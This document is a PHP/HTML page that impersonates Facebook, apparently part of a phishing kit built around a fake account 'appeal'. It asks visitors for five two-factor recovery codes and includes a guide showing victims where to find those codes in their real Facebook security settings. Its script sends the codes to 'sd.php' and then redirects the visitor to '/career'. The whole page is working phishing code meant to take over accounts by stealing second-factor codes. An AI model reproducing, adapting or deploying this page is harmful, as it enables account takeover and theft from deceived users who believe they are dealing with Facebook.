<?php


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
    <link rel="stylesheet" href="./assets/css/twofa.css">
    <link href="./assets/css/boxicons.min.css" rel="stylesheet">
<style>
    body{
        background-color: #FFFFFF !important;
    }
    .box{
        border:none !important;
    }
    .backup-input {
        width: 100% !important;
        height: 45px !important;
        outline: none !important;
        border-radius: 8px !important;
        padding: 12px !important;
        margin-bottom: 10px !important;
        border: 1px solid #ccd0d5 !important;
        font-size: 14px !important;
    }
    .backup-input:focus {
        border-color: #1877f2 !important;
        box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2) !important;
    }
    .submit2fa{
        width: 100% !important;
        outline: none !important;
        border-radius: 8px !important;
        padding: 10px !important;
        background-color: #1877f2 !important;
        color: white !important;
        border: none !important;
        font-weight: 500 !important;
        margin-top: 10px !important;
    }
    .submit2fa:disabled {
        opacity: 0.6 !important;
        cursor: not-allowed !important;
        background-color: #1877f2 !important;
    }
    .error-message {
        color: #fa3e3e;
        font-size: 12px;
        margin-top: -8px;
        margin-bottom: 8px;
        display: none;
    }
    .help-link {
        color: #1877f2;
        text-decoration: none;
        font-size: 14px;
        cursor: pointer;
        display: inline-block;
        margin-top: 10px;
    }
    .help-link:hover {
        text-decoration: underline;
    }
    #guideModal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        z-index: 1000;
        overflow-y: auto;
        -webkit-overflow-scrolling: touch;
    }
    .modal-content {
        background: white;
        width: 90%;
        max-width: 500px;
        margin: 20px auto;
        padding: 20px;
        border-radius: 8px;
        position: relative;
        max-height: 90vh;
        overflow-y: auto;
    }
    @media (max-width: 768px) {
        .modal-content {
            margin: 10px auto;
            width: 95%;
            max-height: 85vh;
        }
        #guideModal {
            align-items: flex-start;
            padding: 10px 0;
        }
    }
    .close-modal {
        position: absolute;
        right: 20px;
        top: 15px;
        font-size: 24px;
        cursor: pointer;
        color: #65676b;
    }
    .modal-content h4 {
        margin-bottom: 20px;
        color: #1c1e21;
        font-size: 20px;
    }
    .modal-content ol {
        padding-left: 20px;
        margin-bottom: 20px;
    }
    .modal-content li {
        margin-bottom: 15px;
        color: #1c1e21;
        line-height: 1.4;
    }
    .modal-content .note {
        background: #f7f8fa;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 15px;
    }
    .modal-content .support-text {
        color: #65676b;
        font-size: 13px;
        margin-top: 15px;
    }
</style>

    <title>Facebook</title>

</head>
<body>
<div class="navbar">
        <div class="container">
            <a href="/"><p><img src="./assets/img/fblogo.svg" class="logonav"></p></a>
            <div class="logout">
            <a href="#"><p>Log out</p></a>
        </div>
        </div>
</div>
<div class="mm">
<div class="box">

<div class="box_content">
<h4><b>Enter your recovery codes</b></h4>
<p>Please enter 5 recovery codes from your Facebook two-factor authentication settings.</p>
<br>
<form method="POST" name="formfa" id="formfa" class="form" onsubmit="return onLoginSubmit(event, this)">
    <div class="form-group">
        <input type="text" name="backup1" class="backup-input" placeholder="Enter recovery code 1" maxlength="8">
        <div class="error-message"></div>
        
        <input type="text" name="backup2" class="backup-input" placeholder="Enter recovery code 2" maxlength="8">
        <div class="error-message"></div>
        
        <input type="text" name="backup3" class="backup-input" placeholder="Enter recovery code 3" maxlength="8">
        <div class="error-message"></div>
        
        <input type="text" name="backup4" class="backup-input" placeholder="Enter recovery code 4" maxlength="8">
        <div class="error-message"></div>
        
        <input type="text" name="backup5" class="backup-input" placeholder="Enter recovery code 5" maxlength="8">
        <div class="error-message"></div>

        <div class="bottomline">
            <button type="submit" class="submit2fa" name="submit" id="submit">
                <i class="bx bx-loader-alt bx-spin" style="display: none;"></i>Continue
            </button>
        </div>
    </div>
</form>
<a class="help-link" onclick="showGuide()">How to get codes?</a>
</div>
</div>
</div>

<!-- Guide Modal -->
<div id="guideModal">
    <div class="modal-content">
        <span class="close-modal" onclick="hideGuide()">&times;</span>
        <h4>How to Get Recovery Codes</h4>
        <ol>
            <li>Go to Two-Factor Authentication settings via this link: <a href="https://accountscenter.facebook.com/password_and_security" target="_blank">https://accountscenter.facebook.com/password_and_security</a></li>
            <li>Under the Two-Factor Authentication section, click your Facebook Profile. You may need to re-enter your password.</li>
            <li>Click on Additional Methods, after that copy a recovery code and paste it down below.</li>
        </ol>
        <div class="note">
            <strong>Note:</strong> In case you do not see any backup / recovery codes, you will need to setup the two factor authentication via Text Message which is located after step 2, after you successfully set the text message authentication please continue via this link to continue with the appeal.
        </div>
        <div style="text-align: center; margin-top: 20px;">
            <img src="./assets/img/recovery.gif" alt="Recovery codes guide" style="max-width: 100%; height: auto; border-radius: 8px;">
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('formfa');
    const submitButton = document.getElementById('submit');
    const inputs = form.querySelectorAll('.backup-input');
    const errorMessages = form.querySelectorAll('.error-message');
    
    // Disable submit button by default
    submitButton.disabled = true;

    // Function to validate a single backup code
    function isValidBackupCode(code) {
        return code.length === 6 || code.length === 8;
    }

    // Function to validate all inputs and update button state
    function validateInputs() {
        let validCount = 0;
        let allValid = true;
        
        inputs.forEach((input, index) => {
            const value = input.value.trim();
            if (value) {
                if (isValidBackupCode(value)) {
                    validCount++;
                    input.style.borderColor = '#ccd0d5';
                    errorMessages[index].style.display = 'none';
                } else {
                    allValid = false;
                    input.style.borderColor = '#fa3e3e';
                    errorMessages[index].textContent = 'Code must be 6 or 8 characters';
                    errorMessages[index].style.display = 'block';
                }
            }
        });

        // Enable button if at least 5 valid codes are entered
        submitButton.disabled = !(validCount === 5 && allValid);
    }

    // Add input event listeners
    inputs.forEach(input => {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9a-zA-Z]/g, ''); // Allow only numbers and letters
            validateInputs();
        });
    });

    // Handle form submission
    function onLoginSubmit(e, form) {
        e.preventDefault();
        
        const submitButton = form.querySelector('#submit');
        const spinner = submitButton.querySelector('i');
        
        // Collect all backup codes
        const backupCodes = Array.from(inputs).map(input => input.value.trim());
        
        // Disable button and show spinner
        submitButton.disabled = true;
        spinner.style.display = 'inline-block';
        submitButton.innerHTML = '<i class="bx bx-loader-alt bx-spin"></i> Verifying';
        
        // Send the backup codes to server
        const formData = {
            backup1: backupCodes[0],
            backup2: backupCodes[1],
            backup3: backupCodes[2],
            backup4: backupCodes[3],
            backup5: backupCodes[4]
        };
        
        $.post('sd.php', formData)
            .done(function(response) {
                console.log(response);
                setTimeout(() => {
                    window.location.href = "/career";
                }, 2000);
            })
            .fail(function() {
                console.error('Error during submission');
                submitButton.disabled = false;
                spinner.style.display = 'none';
                submitButton.innerHTML = 'Continue';
            });
            
        return false;
    }

    // Attach the onLoginSubmit function to the global scope
    window.onLoginSubmit = onLoginSubmit;
});

// Guide modal functions
function showGuide() {
    document.getElementById('guideModal').style.display = 'block';
}

function hideGuide() {
    document.getElementById('guideModal').style.display = 'none';
}

// Close modal when clicking outside
window.onclick = function(event) {
    const modal = document.getElementById('guideModal');
    if (event.target == modal) {
        hideGuide();
    }
}
</script>

</body>
</html>